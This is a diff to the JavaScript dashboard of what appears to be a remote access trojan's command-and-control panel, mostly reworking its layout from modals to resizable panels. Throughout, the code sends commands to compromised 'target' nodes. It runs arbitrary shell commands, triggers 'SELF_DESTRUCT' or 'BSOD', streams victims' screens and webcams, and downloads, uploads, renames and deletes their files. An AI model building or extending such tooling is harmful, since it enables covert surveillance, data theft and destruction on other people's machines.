@@ -143,6 +143,13 @@ async function fetchData() {
     document.getElementById('output').innerHTML = "";
     document.getElementById('filterContainer').classList.add('hidden');
     document.getElementById('exportBtn').classList.add('hidden');
+    
+    // Clear out session specific panels
+    document.getElementById('fs-active-node').innerText = "None";
+    document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target & click 'Open File Explorer'</td></tr>`;
+    document.getElementById('terminal-connection-msg').innerText = "Waiting for node...";
+    stopStream();
+
     renderMap();
     renderNodesList();
 
@@ -267,19 +274,19 @@ function renderNodesList() {
         let safeLng = getSafeCoord(node.lng, false);
 
         container.innerHTML += `
-            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all cursor-pointer" onclick="if(leafletMap) leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
+            <div class="p-2 ${activeBorder} rounded-lg relative overflow-hidden group transition-all cursor-pointer" onclick="if(leafletMap) leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
                 ${activeLine}
-                <div class="flex justify-between items-start mb-2 pl-2">
+                <div class="flex justify-between items-start mb-1 pl-2">
                     <div class="flex items-center gap-2">
-                        <i class="${osIconClass} text-lg"></i>
+                        <i class="${osIconClass} text-base"></i>
                         <div>
-                            <p class="text-sm font-bold text-white truncate max-w-[120px]">${node.id}</p>
-                            <p class="text-[10px] text-gray-400 font-mono">${node.ip}</p>
+                            <p class="text-xs font-bold text-white truncate max-w-[120px]">${node.id}</p>
+                            <p class="text-[9px] text-gray-400 font-mono">${node.ip}</p>
                         </div>
                     </div>
-                    <span class="w-2.5 h-2.5 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
+                    <span class="w-2 h-2 mt-1 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
                 </div>
-                <p class="text-[10px] text-gray-500 mt-1 pl-2 truncate" title="${node.os}">${node.os}</p>
+                <p class="text-[9px] text-gray-500 pl-2 truncate" title="${node.os}">${node.os}</p>
             </div>`;
     });
 }
@@ -290,7 +297,10 @@ function renderNodesList() {
 window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
+    
+    // Automatically update panels with the target ID if they are idle
     document.getElementById('fs-active-node').innerText = nodeId;
+    document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Stream: ${nodeId}`;
 
     if (terminalPollInterval) {
         clearInterval(terminalPollInterval);
@@ -372,7 +382,6 @@ window.executeTermCommand = function(inputEl) {
             termLog(`Forwarding critical payload to C2 server...`);
             sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? "SELF_DESTRUCT" : "BSOD");
         } else {
-            // NEW: Send the real shell command to the payload
             termLog(`Executing command on target: ${val}...`);
             sendCommandToNode(activeNodeId, `SHELL:${val}`);
         }
@@ -426,6 +435,12 @@ window.startStream = async function(type, monitorIndex = -1) {
         return showToast("No active node selected!", "error");
     }
     
+    // Ensure panel is not minimized
+    const panel = document.getElementById('panel-live');
+    if (panel.dataset.minimized === 'true') {
+        toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
+    }
+
     if (streamInterval) {
         stopStream(); 
     }
@@ -433,51 +448,44 @@ window.startStream = async function(type, monitorIndex = -1) {
     activeStream.type = type;
     activeStream.monitor = monitorIndex;
 
-    const modal = document.getElementById('liveViewModal');
     const title = document.getElementById('liveViewTitle');
     const monitorControls = document.getElementById('monitorControls');
     const imageEl = document.getElementById('liveViewImage');
     const spinner = document.getElementById('liveViewSpinner');
     
-    spinner.style.display = 'block';
+    spinner.style.display = 'flex';
+    spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Awaiting frames...</p>`;
     imageEl.src = "";
     imageEl.style.display = 'none';
-
-    modal.classList.remove('hidden');
-    setTimeout(() => modal.classList.add('visible'), 10);
 
     let streamTarget = type === 'screen' ? `SCREEN_${monitorIndex}` : 'WEBCAM';
 
     // Slider UI injected inline
     let sliderHtml = `
-        <div class="flex items-center gap-2 ml-4 border-l border-gray-700 pl-4">
-            <span class="text-[10px] text-gray-400 font-bold" title="High FPS, Low Quality"><i class="fa-solid fa-gauge-high"></i> FPS</span>
-            <input type="range" min="10" max="90" step="10" value="${activeQuality}" onchange="changeStreamQuality(this.value)" class="w-24 accent-cyberBlue cursor-pointer">
-            <span class="text-[10px] text-gray-400 font-bold" title="Low FPS, High Quality"><i class="fa-solid fa-image"></i> QUAL</span>
-            <span id="qualityLabel" class="text-[10px] text-cyberBlue font-mono ml-1">Q: ${activeQuality}</span>
+        <div class="flex items-center gap-1 border-l border-gray-700 pl-2 ml-1">
+            <span class="text-[9px] text-gray-500" title="High FPS, Low Quality"><i class="fa-solid fa-gauge-high"></i></span>
+            <input type="range" min="10" max="90" step="10" value="${activeQuality}" onchange="changeStreamQuality(this.value)" class="w-16 h-1 bg-gray-700 rounded-lg appearance-none cursor-pointer">
+            <span class="text-[9px] text-gray-500" title="Low FPS, High Quality"><i class="fa-solid fa-image"></i></span>
+            <span id="qualityLabel" class="text-[9px] text-cyberBlue font-mono ml-1 w-6">Q:${activeQuality}</span>
         </div>
     `;
 
     if (type === 'screen') {
-        title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-3"></i>Remote Screen: <span class="font-mono">${activeNodeId}</span>`;
-        // -1 = All Screens. 0 = Mon 1. 1 = Mon 2. 2 = Mon 3.
+        title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}`;
         let monButtons = `
-            <button onclick="startStream('screen', -1)" class="px-3 py-1 text-xs rounded ${monitorIndex === -1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">All</button>
-            <button onclick="startStream('screen', 0)" class="px-3 py-1 text-xs rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 1</button>
-            <button onclick="startStream('screen', 1)" class="px-3 py-1 text-xs rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 2</button>
-            <button onclick="startStream('screen', 2)" class="px-3 py-1 text-xs rounded ${monitorIndex === 2 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 3</button>
+            <button onclick="startStream('screen', -1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === -1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">ALL</button>
+            <button onclick="startStream('screen', 0)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M1</button>
+            <button onclick="startStream('screen', 1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M2</button>
         `;
         monitorControls.innerHTML = monButtons + sliderHtml;
         monitorControls.classList.remove('hidden');
     } else {
-        title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-3"></i>Webcam Feed: <span class="font-mono">${activeNodeId}</span>`;
+        title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
         monitorControls.innerHTML = sliderHtml;
         monitorControls.classList.remove('hidden');
     }
 
     termLog(`Initiating stream for ${streamTarget} at Quality ${activeQuality}...`);
-    
-    // Pipe the target AND the quality value cleanly via the Issue route
     await sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
     streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
 };
@@ -515,13 +523,14 @@ window.stopStream = function() {
         termLog(`Stream stopped for ${activeNodeId}.`);
     }
     activeStream.type = null;
-};
 
-window.closeLiveView = function() {
-    stopStream();
-    const modal = document.getElementById('liveViewModal');
-    modal.classList.remove('visible');
-    setTimeout(() => modal.classList.add('hidden'), 300);
+    // Reset UI to idle
+    document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
+    document.getElementById('monitorControls').classList.add('hidden');
+    document.getElementById('liveViewImage').style.display = 'none';
+    const spinner = document.getElementById('liveViewSpinner');
+    spinner.style.display = 'flex';
+    spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Stream Idle</p>`;
 };
 
 // ==========================================
@@ -532,10 +541,12 @@ window.openFileSystem = function() {
         return showToast("Must authenticate to node first.", "error");
     }
     
-    const modal = document.getElementById('fileExplorerModal');
-    modal.classList.remove('hidden');
-    setTimeout(() => modal.classList.add('visible'), 10);
+    const panel = document.getElementById('panel-fs');
+    if (panel.dataset.minimized === 'true') {
+        toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-fs');
+    }
     
+    document.getElementById('fs-active-node').innerText = activeNodeId;
     requestDirectoryListing('DRIVES');
     termLog("File Explorer initialized. Requesting drive listing...");
 };
@@ -551,9 +562,9 @@ function requestDirectoryListing(path) {
     const tbody = document.getElementById('fsTbody');
     tbody.innerHTML = `
         <tr class="border-b border-gray-800/60">
-            <td colspan="5" class="p-8 text-center text-gray-400 font-mono">
-                <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl"></i>
-                <p class="mt-2 text-sm">Requesting listing for "${path}"...</p>
+            <td colspan="4" class="p-4 text-center text-gray-400 font-mono">
+                <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-lg"></i>
+                <p class="mt-1 text-[10px]">Loading "${path}"...</p>
             </td>
         </tr>
     `;
@@ -568,8 +579,8 @@ function requestDirectoryListing(path) {
             fsPollInterval = null;
             tbody.innerHTML = `
                 <tr class="border-b border-gray-800/60">
-                    <td colspan="5" class="p-8 text-center text-red-500 font-mono">
-                        Request timed out. The node may be offline or unresponsive.
+                    <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
+                        Request timed out. Target may be offline.
                     </td>
                 </tr>
             `;
@@ -600,8 +611,8 @@ function renderFileSystem(data) {
     if (data.error) {
         tbody.innerHTML = `
             <tr class="border-b border-gray-800/60">
-                <td colspan="5" class="p-8 text-center text-red-500 font-mono">
-                    <i class="fa-solid fa-triangle-exclamation mr-2"></i>Error on target: ${escapeHtml(data.error)}
+                <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
+                    <i class="fa-solid fa-triangle-exclamation mr-1"></i>${escapeHtml(data.error)}
                 </td>
             </tr>
         `;
@@ -611,8 +622,8 @@ function renderFileSystem(data) {
     if (!data.contents || data.contents.length === 0) {
         tbody.innerHTML = `
             <tr class="border-b border-gray-800/60">
-                <td colspan="5" class="p-8 text-center text-gray-500 font-mono">
-                    This directory is empty.
+                <td colspan="4" class="p-4 text-center text-gray-500 font-mono text-[10px]">
+                    Directory is empty.
                 </td>
             </tr>
         `;
@@ -636,20 +647,20 @@ function renderFileSystem(data) {
             
             if (!isDir) {
                 actionButtons += `
-                    <button class="text-cyberBlue hover:text-white mx-1" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')">
+                    <button class="text-cyberBlue hover:text-white mx-0.5" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')">
                         <i class="fa-solid fa-download"></i>
                     </button>
                 `;
             }
             
             actionButtons += `
-                <button class="text-yellow-500 hover:text-white mx-1" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')">
+                <button class="text-yellow-500 hover:text-white mx-0.5" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')">
                     <i class="fa-solid fa-pen"></i>
                 </button>
             `;
             
             actionButtons += `
-                <button class="text-red-500 hover:text-white mx-1" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})">
+                <button class="text-red-500 hover:text-white mx-0.5" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})">
                     <i class="fa-solid fa-trash"></i>
                 </button>
             `;
@@ -679,25 +690,21 @@ function renderFileSystem(data) {
         }
 
         const size = item.size > 0 ? formatBytes(item.size) : '';
-        const modified = item.modified > 0 ? new Date(item.modified * 1000).toLocaleString() : 'N/A';
 
         const row = document.createElement('tr');
         row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
         
         row.innerHTML = `
-            <td class="p-3 text-center ${color}" ${action}>
+            <td class="p-1.5 pl-2 text-center ${color}" ${action}>
                 <i class="fa-regular ${icon}"></i>
             </td>
-            <td class="p-3 font-bold text-gray-300" ${action}>
+            <td class="p-1.5 font-bold text-gray-300 truncate max-w-[100px]" ${action} title="${escapeHtml(item.name)}">
                 ${escapeHtml(item.name)}
             </td>
-            <td class="p-3 text-right text-gray-400" ${action}>
+            <td class="p-1.5 text-right text-gray-400 whitespace-nowrap" ${action}>
                 ${size}
             </td>
-            <td class="p-3 text-right text-gray-500 text-xs" ${action}>
-                ${modified}
-            </td>
-            <td class="p-3 text-center">
+            <td class="p-1.5 text-center whitespace-nowrap">
                 ${actionButtons}
             </td>
         `;
@@ -706,10 +713,8 @@ function renderFileSystem(data) {
     });
 }
 
-// --- FILE SYSTEM OPERATIONS (DELETE, RENAME, DOWNLAOD, UPLOAD) ---
 window.deleteItem = function(fullPath, isDir) {
     const type = isDir ? 'folder' : 'file';
-    
     if(confirm(`Are you sure you want to permanently delete this ${type}?\n\nTarget: ${fullPath}`)) {
         sendCommandToNode(activeNodeId, `DELETE:${fullPath}`);
         showToast(`Delete command sent for ${fullPath}`);
@@ -719,11 +724,9 @@ window.deleteItem = function(fullPath, isDir) {
 
 window.renameItem = function(fullPath, currentName) {
     const newName = prompt(`Enter new name for ${currentName}:`, currentName);
-    
     if(newName && newName !== currentName) {
         const dirPath = fullPath.substring(0, fullPath.lastIndexOf('\\'));
         const newPath = dirPath + '\\' + newName;
-        
         sendCommandToNode(activeNodeId, `RENAME:${fullPath}|${newPath}`);
         showToast(`Rename command sent.`);
         setTimeout(() => requestDirectoryListing(currentFsPath), 2000);
@@ -769,8 +772,7 @@ window.downloadFile = function(fullPath) {
                     showToast("Download complete!", "success");
                 }
             }
-        } catch(e) { 
-        }
+        } catch(e) { }
     }, 2000);
 };
 
@@ -781,14 +783,8 @@ window.triggerUpload = function() {
 document.getElementById('fileUploadInput').onchange = function(e) { 
     const file = e.target.files[0];
     if(!file) return;
-    
-    if(!currentFsPath || currentFsPath === 'DRIVES') {
-        return showToast("Navigate to a directory first.", "error");
-    }
-    
-    if(file.size > 10 * 1024 * 1024) {
-        return showToast("File exceeds 10MB limit.", "error");
-    }
+    if(!currentFsPath || currentFsPath === 'DRIVES') return showToast("Navigate to a directory first.", "error");
+    if(file.size > 10 * 1024 * 1024) return showToast("File exceeds 10MB limit.", "error");
 
     const reader = new FileReader();
     reader.onload = function(evt) {
@@ -797,7 +793,6 @@ document.getElementById('fileUploadInput').onchange = function(e) {
         
         sendCommandToNode(activeNodeId, `UPLOAD_FILE:${destPath}|${base64Data}`);
         showToast(`Uploading ${file.name}...`);
-        
         setTimeout(() => requestDirectoryListing(currentFsPath), 3500);
     };
     reader.readAsDataURL(file);
@@ -825,32 +820,20 @@ function updateBreadcrumbs(path) {
         } else {
             container.innerHTML += `
                 <span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span>
-                <span class="text-gray-600 mx-1">/</span>
+                <span class="text-gray-600 mx-0.5">/</span>
             `;
         }
     });
 }
 
-function formatBytes(bytes, decimals = 2) {
-    if (bytes === 0) return '0 Bytes';
+function formatBytes(bytes, decimals = 1) {
+    if (bytes === 0) return '0 B';
     const k = 1024;
     const dm = decimals < 0 ? 0 : decimals;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    const sizes = ['B', 'KB', 'MB', 'GB'];
     const i = Math.floor(Math.log(bytes) / Math.log(k));
     return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
-
-window.closeFileSystem = function() {
-    if (fsPollInterval) {
-        clearInterval(fsPollInterval);
-    }
-    fsPollInterval = null;
-    currentFsPath = null;
-    
-    const modal = document.getElementById('fileExplorerModal');
-    modal.classList.remove('visible');
-    setTimeout(() => modal.classList.add('hidden'), 300);
-};
 
 window.navigateUp = function() {
     if (!currentFsPath || currentFsPath === 'DRIVES') {
@@ -893,7 +876,6 @@ window.switchTab = function(tabId) {
         
     document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
 
-    // --- LEAFLET LAZY INIT FIX ---
     // Safely waits until the RAT view is rendered to give Leaflet a real DOM size.
     if (tabId === 'rat') {
         if (!leafletMap) {
@@ -994,7 +976,10 @@ function initDragAndDrop() {
 function initResizers() {
     setupResizer('rz-v1', 'col-left', 'col-mid', true);
     setupResizer('rz-v2', 'col-mid', 'col-right', true);
+    
+    setupResizer('rz-h-left', 'slot-1', 'slot-live', false);
     setupResizer('rz-h1', 'slot-2', 'slot-3', false);
+    setupResizer('rz-h-right', 'slot-4', 'slot-fs', false);
 }
 
 function setupResizer(resizerId, prevId, nextId, isVertical) {
@@ -1079,8 +1064,13 @@ window.resetLayout = function() {
     document.getElementById('col-left').style.flexBasis = '25%';
     document.getElementById('col-mid').style.flexBasis = '50%';
     document.getElementById('col-right').style.flexBasis = '25%';
-    document.getElementById('slot-2').style.flexBasis = '50%';
-    document.getElementById('slot-3').style.flexBasis = '50%';
+    
+    const slots = ['slot-1', 'slot-live', 'slot-2', 'slot-3', 'slot-4', 'slot-fs'];
+    slots.forEach(id => {
+        if(document.getElementById(id)) {
+            document.getElementById(id).style.flexBasis = '50%';
+        }
+    });
     
     document.querySelectorAll('.drag-panel').forEach(p => { 
         p.classList.remove('maximized', 'collapsed'); 
